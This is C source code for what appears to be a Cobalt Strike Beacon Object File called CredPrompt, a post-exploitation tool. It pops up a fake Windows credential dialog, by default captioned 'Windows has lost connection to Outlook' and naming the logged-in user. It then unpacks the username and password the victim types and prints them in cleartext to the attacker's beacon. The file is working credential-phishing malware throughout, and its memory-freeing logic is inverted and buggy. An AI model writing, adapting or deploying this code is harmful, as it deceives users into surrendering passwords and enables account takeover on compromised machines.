#include "credprompt.h"

VOID go(
    IN PCHAR Buffer,
    IN ULONG Length)
{
    datap parser;
    char *input = NULL;

    BeaconDataParse(&parser, Buffer, Length);
    input = BeaconDataExtract(&parser, NULL);
    wchar_t convertedArgs[MAX_PATH] = {0};
    toWideChar(input, convertedArgs, MAX_PATH);

    BeaconPrintf(CALLBACK_OUTPUT, "===== CredPrompt =====\n");

    LPWSTR defaultMessage = L"Windows has lost connection to Outlook";
    LPWSTR boxMessage = NULL;

    LPWSTR currentUsername = NULL;
    DWORD len = MAX_PATH;

    currentUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len);

    if (SECUR32$GetUserNameExW(NameSamCompatible, currentUsername, &len))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Current user is : %ls\n", currentUsername);
    }

    WCHAR username[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)] = {0};
    WCHAR password[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)] = {0};

    LPWSTR baseCaption = L"Please enter the credentials for ";

    int captionSize = MSVCRT$wcslen(baseCaption) + MSVCRT$wcslen(currentUsername);
    LPWSTR caption = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (captionSize + 1) * sizeof(WCHAR));

    MSVCRT$wcscat(caption, baseCaption);
    MSVCRT$wcscat(caption, currentUsername);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Caption is : %ls\n", caption);

    CREDUI_INFOW credui = {sizeof(credui)};
    credui.cbSize = sizeof(credui);
    credui.hwndParent = NULL;

    credui.pszMessageText = caption;

    credui.pszCaptionText = boxMessage;

    if (MSVCRT$wcslen(convertedArgs) > 0)
    {
        credui.pszCaptionText = convertedArgs;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Change the default message with : '%ls'\n", convertedArgs);
    }
    else
    {
        boxMessage = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (MSVCRT$wcslen(defaultMessage) + 1) * sizeof(WCHAR));
        MSVCRT$wcscat(boxMessage, defaultMessage);
        credui.pszCaptionText = boxMessage;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Used the default message : '%ls'\n", boxMessage);
    }

    credui.hbmBanner = NULL;

    ULONG authPackage = 0;
    LPVOID outCredBuffer = NULL;
    ULONG outCredSize = 0;
    DWORD uLen = CREDUI_MAX_USERNAME_LENGTH;
    DWORD pLen = CREDUI_MAX_PASSWORD_LENGTH;
    BOOL save = FALSE;

    int result = CREDUI$CredUIPromptForWindowsCredentialsW(&credui, 0, &authPackage, NULL, 0, &outCredBuffer, &outCredSize, &save, CRED_TYPE_GENERIC);

    if (result == ERROR_SUCCESS)
    {
        CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, username, &uLen, NULL, 0, password, &pLen);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Username: %ls\n", username);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Password: %ls\n", password);
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] User did not input credentials");
    }

    if (!username)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, username);

    if (!password)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, password);

    if (!boxMessage)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, boxMessage);

    if (!caption)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, caption);

    if (!convertedArgs)
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, convertedArgs);
};